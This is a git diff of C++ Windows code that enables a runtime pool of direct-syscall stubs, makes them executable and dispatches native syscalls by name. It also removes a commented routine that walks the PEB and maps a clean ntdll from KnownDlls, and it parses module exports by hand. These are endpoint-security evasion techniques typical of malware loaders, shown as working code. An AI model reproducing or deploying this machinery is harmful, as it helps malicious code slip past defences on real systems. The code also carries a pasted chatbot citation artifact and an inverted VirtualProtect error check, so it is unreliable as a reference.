+        if(stubOffset + SIZE_OF_SYSCALL_CODE > MAX_SYSCALLS * SIZE_OF_SYSCALL_CODE)
+        {
+            fuk("The Syscall Pool is full");
+            return (void*)(~0ull);
+        }
 
-//         stubAddress = pSyscallPool + stubOffset;
-//         for (size_t i = 0; i < SIZE_OF_SYSCALL_CODE; ++i) stubAddress[i] = syscall_code[i];
+        stubAddress = pSyscallPool + stubOffset;
+        for (size_t i = 0; i < SIZE_OF_SYSCALL_CODE; ++i) stubAddress[i] = syscall_code[i];
         
-//         sEntry[j].pStubAddress = stubAddress;
-//         stubOffset += sEntry->stubsize;
+        sEntry[j].pStubAddress = stubAddress;
+        stubOffset += sEntry->stubsize;
 
-//         ++stubCount;
-//     }
+        ++stubCount;
+    }
 
-//     // Ensure memory is executable
-//     DWORD oldProtect;
-//     if (!(BYTE)((pVirtualProtect)sGhostFn.pVirtualProtect)(pSyscallPool, stubOffset, 0x20, &oldProtect))
-//     {
-//         fuk("Failed to set RX permissions for syscall stubs.");
-//         return (void*)(~0ull);
-//     } 
-//     ok("Memory is executable\n");
+    // Ensure memory is executable
+    DWORD oldProtect;
+    if (fn.MyVirtualProtect(pSyscallPool, stubOffset, 0x20, &oldProtect))
+    {
+        fuk("Failed to set RX permissions for syscall stubs.");
+        return (void*)(~0ull);
+    } 
+    ok("Memory is executable\n");
 
-//     return (void*)(1ull);
-// }
+    return (void*)(1ull);
+}
 
-// void* SysFunction(const char* function_name, ...)
-// {
+void* SysFunction(const char* function_name, ...)
+{
+    void* pExecMem = nullptr;
 
-//     void* pExecMem = nullptr;
-
-//     for(int i = 0; i < stubCount; ++i)
-//     {
-//         if(strcmp(syscallEntries[i].function_name, function_name) == 0)
-//         {
-//             pExecMem = syscallEntries[i].pStubAddress;
-//             break;
-//         }
-//     }
-//     if (!pExecMem)
-//     {
-//         fuk("Syscall not found: ", function_name);
-//         return (void*)(~0ull);
-//     }
+    for(int i = 0; i < stubCount; ++i)
+    {
+        if(strcmp(syscallEntries[i].function_name, function_name) == 0)
+        {
+            pExecMem = syscallEntries[i].pStubAddress;
+            break;
+        }
+    }
+    if (!pExecMem)
+    {
+        fuk("Syscall not found: ", function_name);
+        return (void*)(~0ull);
+    }
 
 
-//     GenericSyscallType syscallFunc = reinterpret_cast<GenericSyscallType>(pExecMem);
+    GenericSyscallType syscallFunc = reinterpret_cast<GenericSyscallType>(pExecMem);
 
-//     va_list args;
-//     va_start(args, function_name);
+    va_list args;
+    va_start(args, function_name);
 
-//     void* argList[16] = {};
-//     for(int i = 1; i < 16 ; ++i)
-//     {
-//         void* arg = va_arg(args, void*);
-//         if(arg) argList[i] = arg;
-//     }
-//     va_end(args);
+    void* argList[16] = {};
+    for(int i = 1; i < 16 ; ++i)
+    {
+        void* arg = va_arg(args, void*);
+        if(arg) argList[i] = arg;
+    }
+    va_end(args);
 
-//     void* retValue = nullptr;
-//     retValue = syscallFunc(argList[1], argList[2], argList[3], argList[4], argList[5],
-//                             argList[6], argList[7], argList[8], argList[9], argList[10],
-//                             argList[11], argList[12], argList[13], argList[14], argList[15]
-//     );
+    void* retValue = nullptr;
+    retValue = syscallFunc(argList[1], argList[2], argList[3], argList[4], argList[5],
+                            argList[6], argList[7], argList[8], argList[9], argList[10],
+                            argList[11], argList[12], argList[13], argList[14], argList[15]
+    );
 
-//     return retValue;
-// }
+    return retValue;
+}
 
 // void InitUnicodeString(UNICODE_STRING& u, const wchar_t* s)
 // {
@@ -585,69 +588,6 @@ void GetFunctions()
 //     u.Buffer        = const_cast<wchar_t*>(s);
 // }
 
-// int GetNtdll()
-// {
-//     typedef enum _SECTION_INHERIT {ViewShare = 1,ViewUnmap = 2} SECTION_INHERIT;
-
-//     //hNtdll = GetModuleHandleW(L"ntdll.dll");
-//     // 1) Get PEB address from TEB
-//     PPEB peb = (PPEB)__readgsqword(0x60);              // x64: GS:[0x60] → PEB :contentReference[oaicite:3]{index=3}
-//     PPEB_LDR_DATA ldr = peb->Ldr;                     // PEB->Ldr :contentReference[oaicite:4]{index=4}
-    
-//     // 2) Walk the InLoadOrderModuleList
-//     LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
-//     for (LIST_ENTRY* cur = head->Flink; cur != head; cur = cur->Flink)
-//     {
-//         // Compute the base address of the containing LDR_DATA_TABLE_ENTRY
-//         auto entry = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-
-//         // Compare BaseDllName to L"ntdll.dll"
-//         if (_wcsicmp(entry->BaseDllName.Buffer, L"ntdll.dll") == 0)
-//         {
-//             hNtdll = (HMODULE)entry->DllBase;
-//             break;
-//         }
-//     }
-
-//     if (!hNtdll)
-//     {
-//         fuk("Couldn't find ntdll in PEB");
-//         return 1;
-//     }
-
-//     UNICODE_STRING name;
-//     InitUnicodeString(name, L"\\KnownDlls\\ntdll.dll");
-    
-//     OBJECT_ATTRIBUTES oa;
-//     InitializeObjectAttributes(&oa, &name, 0x00000040L, NULL, NULL);
-
-//     //Open the section object
-//     HANDLE hSection = NULL;
-//     NTSTATUS status = NtOpenSection(&hSection, 0x0004, &oa);
-//     if (!NT_SUCCESS(status))
-//     {
-//         fuk("NtOpenSection failed: 0x", status);
-//         return 1;
-//     }
-
-//     //Map a read‑only view
-//     void* baseAddress = NULL;
-//     SIZE_T viewSize = 0;
-//     status = NtMapViewOfSection(hSection, GetCurrentProcess(), &baseAddress, 0, 0, NULL, &viewSize, (SECTION_INHERIT)2, 0, 0x02);
-//     CloseHandle(hSection);
-    
-//     if (!NT_SUCCESS(status))
-//     {
-//         fuk("NtMapViewOfSection failed: 0x", status);
-//         return 1;
-//     }
-//     norm("\nClean ntdll.dll mapped at: 0x", std::hex, CYAN"", baseAddress,"\n");
-//     hNtdll = reinterpret_cast<HMODULE>(baseAddress);
-
-//     //UnmapViewOfFile(baseAddress);            //unmap it, when done
-//     return 0;
-// }
-
 int main()
 {
     srand(static_cast<unsigned>(time(nullptr)));
@@ -655,18 +595,10 @@ int main()
     DWORD dSSN = 0;
     IO_STATUS_BLOCK ioStatusBlock = {};
 
-    // if(GetNtdll())
-    // {
-    //     fuk("DIDNT WORK");
-    //     return 1;
-    // }
-    // else
-    // {
-    //     ok("NOICE");
-    //     return 0;
-    // }
-
-    GetFunctions();
+    if(!GetFunctions())
+    {
+        return 1;
+    }
     ///////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 //     pSyscallPool = (BYTE*)((pVirtualAlloc)sGhostFn.pVirtualAlloc)(nullptr, MAX_SYSCALLS * 0x40, 0x00001000 | 0x00002000, 0x40);
@@ -775,14 +707,16 @@ int main()
 
 void* FindExportAddress(HMODULE hModule, const char* funcName)
 {
+norm(YELLOW"\n###########################");
+
     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
     IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);
-
     IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
 
     DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
     WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
     DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
+norm(YELLOW"\n$$$$$$$$$$$$$$$$$$$$$$$$$$$");
     for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
     {
         char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
